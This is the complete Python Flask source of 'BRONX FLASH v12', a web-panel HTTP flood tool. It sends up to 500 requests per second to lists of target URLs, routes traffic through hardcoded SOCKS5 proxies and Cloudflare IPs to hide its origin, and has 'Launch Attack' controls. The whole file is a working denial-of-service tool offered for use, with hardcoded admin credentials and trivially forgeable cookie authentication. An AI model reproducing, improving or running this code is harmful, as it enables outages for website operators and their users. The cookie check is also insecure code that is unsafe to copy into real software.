from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
custom_proxies = []

# Cloudflare IP Pool
CF_IPS = [
    "104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5",
    "104.16.0.1","104.16.0.2","104.16.0.3","172.67.0.1","172.67.0.2"
]

# Default SOCKS5 Proxies
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080","173.212.239.43:1080"
]

# Session Pool for multi-session
session_pool = []

def get_session():
    if not session_pool:
        for _ in range(20):
            s = requests.Session()
            s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            session_pool.append(s)
    return random.choice(session_pool)

# Speed configs (requests per second)
SPEEDS = {
    "slow": {"rate": 2, "delay": 0.2, "workers": 2},
    "fast": {"rate": 5, "delay": 0.15, "workers": 5},
    "veryfast": {"rate": 10, "delay": 0.1, "workers": 10},
    "ultra": {"rate": 50, "delay": 0.05, "workers": 25},
    "lightning": {"rate": 100, "delay": 0.02, "workers": 50},
    "flash": {"rate": 500, "delay": 0.001, "workers": 100}
}

LOGIN = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v12</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,85,0.05) 1px,transparent 1px);background-size:40px 40px;animation:bgMove 20s linear infinite}
@keyframes bgMove{0%{transform:translate(0)}100%{transform:translate(40px,40px)}}
.box{background:rgba(5,0,10,0.97);padding:50px;border-radius:24px;border:1px solid rgba(255,0,85,0.2);width:400px;text-align:center;z-index:1;box-shadow:0 0 100px rgba(255,0,85,0.15),0 0 200px rgba(0,200,255,0.05)}
.logo{font-size:4em;animation:glow 2s infinite}@keyframes glow{50%{filter:drop-shadow(0 0 30px rgba(255,0,85,0.8))}}
h1{font-size:2em;font-weight:800;background:linear-gradient(135deg,#ff0055,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.tag{color:#666;font-size:0.7em;letter-spacing:5px;text-transform:uppercase;margin:10px 0}
input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;margin:10px 0;font-size:15px;transition:0.3s}
input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0055,#00c8ff);color:#fff;border:none;border-radius:12px;font-weight:700;cursor:pointer;font-size:15px;margin-top:15px;letter-spacing:3px;text-transform:uppercase;transition:0.3s}
.btn:hover{box-shadow:0 0 50px rgba(255,0,85,0.5);transform:translateY(-2px)}
</style></head><body>
<div class="box">
<div class="logo">⚡</div>
<h1>BRONX FLASH</h1>
<div class="tag">v12 • GOD LEVEL</div>
<p style="color:#555;font-size:0.6em;letter-spacing:2px">500 RPS • MULTI-SESSION • AUTO IP</p>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">ACCESS SYSTEM</button>
</form>
{% if error %}<p style="color:#ff0055;margin-top:10px">{{ error }}</p>{% endif %}
</div></body></html>"""

DASH = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v12 • Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:20px;line-height:1.5}
.container{max-width:1200px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 30px;border:1px solid rgba(255,255,255,0.06);border-radius:16px;margin-bottom:24px;background:rgba(255,255,255,0.01);flex-wrap:wrap;gap:15px}
.header h1{font-size:1.8em;font-weight:800;background:linear-gradient(135deg,#ff0055,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px}
.stat{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:20px;text-align:center}
.stat-val{font-size:2.5em;font-weight:800}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}
.stat-label{font-size:0.6em;text-transform:uppercase;letter-spacing:3px;color:#555;margin-top:5px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:16px;margin-bottom:20px}
.card{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:24px}
.card h3{font-size:0.75em;font-weight:600;letter-spacing:3px;text-transform:uppercase;margin-bottom:16px;color:#666}
input,select,textarea{width:100%;padding:12px 15px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:#fff;margin:5px 0;font-size:13px;font-family:inherit;resize:vertical;transition:0.2s}
input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.15);outline:none}
label{font-size:0.6em;text-transform:uppercase;letter-spacing:2px;color:#555;display:block;margin-top:10px}
.btn{width:100%;padding:13px;background:linear-gradient(135deg,#ff0055,#00c8ff);color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:0.75em;letter-spacing:2px;text-transform:uppercase;transition:0.25s;margin:5px 0}
.btn:hover{box-shadow:0 0 35px rgba(255,0,85,0.4);transform:translateY(-1px)}.btn:active{transform:scale(0.97)}
.btn-secondary{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.1)}.btn-secondary:hover{box-shadow:0 0 20px rgba(255,255,255,0.1);color:#fff}
.btn-danger{background:rgba(255,0,0,0.15);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-danger:hover{box-shadow:0 0 25px rgba(255,0,0,0.3)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.logs{background:rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);border-radius:10px;padding:15px;max-height:280px;overflow:auto;font-size:0.7em;font-family:'SF Mono',monospace;color:#00ff88}
.log-e{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);color:#888}
.badge{display:inline-block;padding:5px 14px;border-radius:20px;font-size:0.6em;letter-spacing:2px;text-transform:uppercase}
.badge-active{background:rgba(255,0,85,0.15);color:#ff0055;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.4}}
.toggle-row{display:flex;align-items:center;gap:12px;margin:10px 0}
.toggle{width:44px;height:24px;background:rgba(255,255,255,0.08);border-radius:12px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.4)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:22px}
.footer{text-align:center;padding:20px;color:rgba(255,255,255,0.15);font-size:0.6em;letter-spacing:3px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>BRONX FLASH v12</h1><div style="color:#555;font-size:0.6em;letter-spacing:3px">GOD LEVEL • 500 RPS</div></div>
<a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.7em;letter-spacing:2px">DISCONNECT</a>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">Success</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">Failed</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">Total</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 Attack Configuration</h3>
<label>Target URLs (One per line)</label>
<textarea id="urls" rows="4" placeholder="https://target1.com&#10;https://target2.com&#10;https://target3.com"></textarea>
<div class="row"><div><label>Requests per URL</label><input type="number" id="count" value="5000"></div><div>
<label>Speed Mode</label><select id="speed">
<option value="slow">🐢 Slow (2/s)</option><option value="fast">⚡ Fast (5/s)</option>
<option value="veryfast">🔥 Very Fast (10/s)</option><option value="ultra">💀 Ultra (50/s)</option>
<option value="lightning">⚡ Lightning (100/s)</option><option value="flash" selected>💎 FLASH (500/s)</option>
</select></div></div>
<label>Mode</label><select id="mode">
<option value="direct">Direct (Fastest)</option><option value="cf">Cloudflare IP</option>
<option value="socks5">SOCKS5 Proxy</option><option value="mixed">Mixed (All)</option>
</select>
<button class="btn" onclick="start()">Launch Attack</button>
<button class="btn btn-danger" onclick="stop()">Terminate</button>
<div id="status" style="margin-top:8px"></div>
</div>

<div class="card">
<h3>🔧 Proxy System</h3>
<div class="toggle-row"><span style="font-size:0.7em;color:#666">Proxy System</span><div class="toggle" id="proxyToggle" onclick="toggleProxy()"></div><span id="proxyLabel" style="font-size:0.7em;color:#666">OFF</span></div>
<label>Custom Proxies (IP:Port)</label>
<textarea id="customProxies" rows="3" placeholder="94.158.244.245:1080&#10;68.71.249.153:48606"></textarea>
<button class="btn btn-secondary" onclick="saveProxies()">Save Proxies</button>
</div>
</div>

<div class="card"><h3>📜 Battle Logs</h3><div class="logs" id="logs"><div class="log-e">System ready...</div></div></div>
<div class="footer">BRONX FLASH v12 • GOD LEVEL • 500 RPS</div>
</div>

<script>
let proxyOn=false;
function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('on',proxyOn);document.getElementById('proxyLabel').textContent=proxyOn?'ON':'OFF'}
function saveProxies(){let p=document.getElementById('customProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>{})}
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>`<div class="log-e">${x}</div>`).join('')})}
function start(){let urls=document.getElementById('urls').value.split('\\n').filter(u=>u.trim());let count=document.getElementById('count').value;let speed=document.getElementById('speed').value;let mode=document.getElementById('mode').value;if(urls.length==0)return;fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls,count:parseInt(count),speed,mode,proxy:proxyOn})}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span class="badge badge-active">ACTIVE</span>';l();u()})}
function stop(){fetch('/stop',{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span style="color:#666">Terminated</span>';l()})}
setInterval(()=>{l();u()},1500)
</script></body></html>"""

# ============================================
# ⚡ GOD LEVEL ATTACK ENGINE
# ============================================
def send_direct(url, session):
    try:
        session.get(url, timeout=5, verify=False)
        return True
    except: return False

def send_cf(url, cf_ip, session):
    try:
        headers = {"Host": url.split("/")[2]}
        session.get(f"https://{cf_ip}/", headers=headers, timeout=5, verify=False)
        return True
    except: return False

def send_socks(url, proxy, session):
    try:
        p = {"http":f"socks5://{proxy}","https":f"socks5://{proxy}"}
        session.get(url, proxies=p, timeout=8, verify=False)
        return True
    except: return False

def attack_worker(attack_id, url, count, delay, mode, use_proxy):
    session = get_session()
    all_proxies = custom_proxies + SOCKS5_PROXIES
    
    for i in range(count):
        if attack_id not in active_attacks: break
        
        success = False
        if mode == "direct":
            success = send_direct(url, session)
        elif mode == "cf":
            success = send_cf(url, random.choice(CF_IPS), session)
        elif mode == "socks5":
            proxy = random.choice(all_proxies) if use_proxy else None
            success = send_socks(url, proxy, session) if proxy else send_direct(url, session)
        elif mode == "mixed":
            r = random.random()
            if r < 0.4: success = send_direct(url, session)
            elif r < 0.7: success = send_cf(url, random.choice(CF_IPS), session)
            else:
                p = random.choice(all_proxies)
                success = send_socks(url, p, session) if use_proxy else send_direct(url, session)
        
        with threading.Lock():
            if success: attack_stats["success"] += 1
            else: attack_stats["failed"] += 1
            attack_stats["total"] += 1
        
        if delay > 0: time.sleep(delay)

def run_attack(attack_id, urls, count, speed, mode, use_proxy):
    config = SPEEDS.get(speed, SPEEDS["flash"])
    workers = min(config["workers"], 100)
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        for url in urls:
            for _ in range(max(1, workers // len(urls))):
                executor.submit(attack_worker, attack_id, url, count // workers, config["delay"], mode, use_proxy)
    
    if attack_id in active_attacks: del active_attacks[attack_id]
    attack_logs.append(f"✅ {attack_stats['success']} ❌ {attack_stats['failed']} | {speed.upper()}")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="Access Denied")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    urls = [u.strip() for u in d.get('urls',[]) if u.strip()]
    count = min(int(d.get('count',1000)),100000)
    speed = d.get('speed','flash')
    mode = d.get('mode','direct')
    use_proxy = d.get('proxy',False)
    if not urls: return jsonify({"error":"URLs required"}),400
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🎯 {len(urls)} targets | {count} req | {speed.upper()} | {mode.upper()}")
    t = threading.Thread(target=run_attack, args=(aid,urls,count,speed,mode,use_proxy))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
    return jsonify({"status":"saved"})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
